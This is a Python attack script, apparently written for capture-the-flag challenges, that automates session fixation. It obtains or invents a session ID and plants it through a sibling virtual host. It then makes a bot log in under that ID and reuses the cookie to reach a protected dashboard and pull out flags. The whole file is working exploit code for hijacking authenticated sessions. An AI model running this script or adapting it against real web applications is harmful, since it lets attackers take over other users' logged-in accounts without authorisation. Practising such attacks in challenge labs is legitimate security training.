#!/usr/bin/env python3
"""Session fixation helper.

Mode A (server-minted sid): GET / to obtain a sid, make the bot/victim
authenticate under it (--bot path + --data), then reuse the sid on --check.
Mode B (attacker-chosen sid): --sid VALUE [--plant PATH --plant-host HOST]
plants it (e.g. through a sibling vhost), then same flow.

    python session_fixation.py http://auth5.chal.deti:8064 --bot /helpdesk/verify-link \
        --data 'link=http://auth5.chal.deti:8064/' --check /dashboard
    python session_fixation.py http://auth6.chal.deti:8065 --sid random --plant /plant \
        --plant-host marketing.auth6.chal.deti --plant-data 'sid={sid}' \
        --bot /helpdesk/verify-link --data 'sid={sid}' --check /dashboard
"""
import argparse
import re
import secrets
from urllib.parse import urlparse

import requests

FLAG = re.compile(r"flag\{[^}]+\}")


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url")
    ap.add_argument("--cookie-name", default="sid")
    ap.add_argument("--sid", help="attacker-chosen sid ('random' to generate)")
    ap.add_argument("--plant", help="path that sets the cookie to our value")
    ap.add_argument("--plant-host", help="Host header for the plant request (sibling vhost)")
    ap.add_argument("--plant-data", default="sid={sid}")
    ap.add_argument("--bot", required=True, help="path that makes the victim log in")
    ap.add_argument("--data", default="", help="form body for the bot ({sid} replaced)")
    ap.add_argument("--check", required=True)
    a = ap.parse_args()
    base = a.url.rstrip("/")
    cn = a.cookie_name

    if a.sid:
        sid = secrets.token_hex(16) if a.sid == "random" else a.sid
        if a.plant:
            h = {"Host": a.plant_host} if a.plant_host else {}
            r = requests.post(base + a.plant, data=a.plant_data.replace("{sid}", sid), headers={
                **h, "Content-Type": "application/x-www-form-urlencoded"}, timeout=10)
            print(f"[plant] {r.status_code} Set-Cookie: {r.headers.get('Set-Cookie')}")
    else:
        s = requests.Session()
        s.get(base + "/", timeout=10)
        sid = s.cookies.get(cn)
        if not sid:
            raise SystemExit(f"no '{cn}' cookie issued on GET / (cookies: {s.cookies.get_dict()})")
    print(f"[sid] {sid}")
    r = requests.get(base + a.check, cookies={cn: sid}, timeout=10, allow_redirects=False)
    print(f"[before] {a.check} -> {r.status_code} (should be denied)")
    r = requests.post(base + a.bot, data=a.data.replace("{sid}", sid), cookies={cn: sid}, timeout=20,
                      headers={"Content-Type": "application/x-www-form-urlencoded"})
    print(f"[bot] {r.status_code}")
    r = requests.get(base + a.check, cookies={cn: sid}, timeout=10)
    print(f"[after] {a.check} -> {r.status_code}")
    for f in FLAG.findall(r.text):
        print(f"[FLAG] {f}")


if __name__ == "__main__":
    main()
